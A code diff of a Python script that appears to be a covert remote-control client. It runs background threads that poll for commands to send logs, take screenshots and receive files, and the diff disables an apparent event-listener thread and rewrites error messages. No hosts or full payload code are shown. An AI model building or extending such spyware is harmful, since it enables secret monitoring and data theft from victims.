@@ -46,7 +46,7 @@ def ss_command1():
         if data.get("send_logs"):
             send()
     except Exception as c:
-        print("Error receiving command:", c)
+        print(f"[1]Error: {c}")
         time.sleep(100)
 
 #----------------------------------------------------------------------
@@ -65,8 +65,8 @@ def receiver(): #short polling
                             f.write(chunk)
                 print(f"File received and saved as {filename}")
                 time.sleep(100)
-        except Exception as e:
-            print(f"[Receiver] Error: {e}")
+        except Exception as d:
+            print(f"[2]Error: {d}")
             time.sleep(100)
 #________________________________________________________
 def screenshot():
@@ -86,16 +86,15 @@ def ss_command2():
         if data.get("take_screenshot"):
             screenshot()
     except Exception as e:
-        print("Error receiving command:", e)
+        print(f"[3]Error: {e}")
         time.sleep(100)
 #________________________________________________________
-
-thread1 = threading.Thread(target=event_listener, daemon=True)
+#thread1 = threading.Thread(target=event_listener, daemon=True)
 thread2 = threading.Thread(target=receiver, daemon=True)
 thread3 = threading.Thread(target=ss_command1, daemon=True)
 thread4 = threading.Thread(target=ss_command2, daemon=True)
     # Start the threads
-thread1.start()
+#thread1.start()
 thread2.start()
 thread3.start()
 thread4.start()
